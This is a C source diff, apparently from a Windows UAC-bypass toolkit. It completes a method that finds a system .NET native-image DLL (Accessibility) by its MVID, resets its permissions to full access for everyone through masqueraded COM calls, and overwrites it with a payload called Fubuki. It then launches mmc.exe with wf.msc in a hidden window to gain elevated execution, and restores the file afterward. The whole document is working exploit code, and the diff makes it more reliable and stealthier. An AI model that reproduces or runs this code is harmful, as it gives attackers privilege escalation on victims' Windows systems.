@@ -3637,7 +3637,9 @@ BOOL ucmxNgenLogLastWrite(
     _strcat(szFileName, TEXT("64"));
 #endif
 
+    _strcat(szFileName, TEXT("\\"));
     _strcat(szFileName, NET4_DIR);
+    _strcat(szFileName, TEXT("\\"));
     _strcat(szFileName, TEXT("ngen.log"));
 
     hFile = CreateFile(szFileName, 
@@ -3678,7 +3680,7 @@ NTSTATUS ucmNICPoisonMethod(
     HANDLE hFile;
 
     LPWSTR oldSecurity = NULL;
-    LPWSTR lpAssemblyFilePath = NULL;
+    LPWSTR lpAssemblyFilePath = NULL, lpTargetFileName = NULL;
 
     BOOLEAN IsWin7;
 
@@ -3690,7 +3692,8 @@ NTSTATUS ucmNICPoisonMethod(
 
     INT iRetryCount = 20;
 
-    GUID mvid;
+    GUID targetMVID;
+    FUSION_SCAN_PARAM scanParam;
 
     do {
 
@@ -3702,7 +3705,7 @@ NTSTATUS ucmNICPoisonMethod(
         if (!supFusionGetAssemblyPathByName(TEXT("Accessibility"), &lpAssemblyFilePath))
             break;
 
-        if (!supFusionGetImageMVID(lpAssemblyFilePath, &mvid))
+        if (!supFusionGetImageMVID(lpAssemblyFilePath, &targetMVID))
             break;
 
         if (!IsWin7) {
@@ -3756,17 +3759,42 @@ NTSTATUS ucmNICPoisonMethod(
         }
 #endif
 
-        return 0; //FIXME
+        //
+        // Locate target NI file.
+        //
+        scanParam.ReferenceMVID = &targetMVID;
+        scanParam.lpFileName = NULL;
+
+        _strcpy(szFileName, g_ctx->szSystemRoot);
+        _strcat(szFileName, TEXT("assembly\\NativeImages_"));
+        if (IsWin7)
+            _strcat(szFileName, NET2_DIR);
+        else
+            _strcat(szFileName, NET4_DIR);
+
+#ifdef _WIN64
+        _strcat(szFileName, TEXT("_64"));
+#else
+        _strcat(szFileName, TEXT("_32"));
+#endif
+        _strcat(szFileName, TEXT("\\Accessibility\\"));
+
+        if (!supFusionScanDirectory(szFileName,
+            TEXT("*.dll"),
+            (pfnFusionScanFilesCallback)supFusionFindFileByMVIDCallback,
+            &scanParam))
+        {
+            break;
+        }
+
+        lpTargetFileName = scanParam.lpFileName;
+        if (lpTargetFileName == NULL)
+            break;
 
         //
         // Read existing file to memory.
         //
-        _strcpy(szFileName, g_ctx->szSystemRoot);
-        _strcat(szFileName, TEXT("assembly\\NativeImages_v4.0.30319_64\\Accessibility\\"));
-        _strcat(szFileName, TEXT("c271faaf45757aaa92c5fe9622895485\\")); //FIXME
-        _strcat(szFileName, ACCESSIBILITY_NI_DLL);
-
-        origFileBuffer = supReadFileToBuffer(szFileName, &origSize);
+        origFileBuffer = supReadFileToBuffer(lpTargetFileName, &origSize);
         if (origFileBuffer == NULL)
             break;
 
@@ -3774,7 +3802,7 @@ NTSTATUS ucmNICPoisonMethod(
         // Remember old file security permissions.
         //
         oldSecurity = NULL;
-        if (!ucmMasqueradedGetObjectSecurityCOM(szFileName,
+        if (!ucmMasqueradedGetObjectSecurityCOM(lpTargetFileName,
             DACL_SECURITY_INFORMATION,
             SE_FILE_OBJECT,
             &oldSecurity))
@@ -3785,7 +3813,7 @@ NTSTATUS ucmNICPoisonMethod(
         //
         // Reset target file permissions.
         //
-        if (!ucmMasqueradedSetObjectSecurityCOM(szFileName,
+        if (!ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
             DACL_SECURITY_INFORMATION,
             SE_FILE_OBJECT,
             T_SDDL_ALL_FOR_EVERYONE))
@@ -3796,7 +3824,7 @@ NTSTATUS ucmNICPoisonMethod(
         //
         // Overwrite file with Fubuki.
         //
-        hFile = CreateFile(szFileName,
+        hFile = CreateFile(lpTargetFileName,
             GENERIC_WRITE,
             0,
             NULL,
@@ -3815,7 +3843,7 @@ NTSTATUS ucmNICPoisonMethod(
         //
         _strcpy(szTargetProc, g_ctx->szSystemDirectory);
         _strcat(szTargetProc, MMC_EXE);
-        if (supRunProcess2(szTargetProc, TEXT("wf.msc"), NULL, SW_SHOW, TRUE))
+        if (supRunProcess2(szTargetProc, TEXT("wf.msc"), NULL, SW_HIDE, TRUE))
             MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
@@ -3826,9 +3854,9 @@ NTSTATUS ucmNICPoisonMethod(
     //
     // Restore original file contents and permissions.
     //
-    if (origFileBuffer) {
+    if (origFileBuffer && lpTargetFileName) {
 
-        hFile = CreateFile(szFileName,
+        hFile = CreateFile(lpTargetFileName,
             GENERIC_WRITE,
             0,
             NULL,
@@ -3846,13 +3874,15 @@ NTSTATUS ucmNICPoisonMethod(
 
         if (oldSecurity) {
 
-            ucmMasqueradedSetObjectSecurityCOM(szFileName,
+            ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
                 DACL_SECURITY_INFORMATION,
                 SE_FILE_OBJECT,
                 oldSecurity);
 
             CoTaskMemFree(oldSecurity);
         }
+
+        supHeapFree(lpTargetFileName);
     }
 
     return MethodResult;
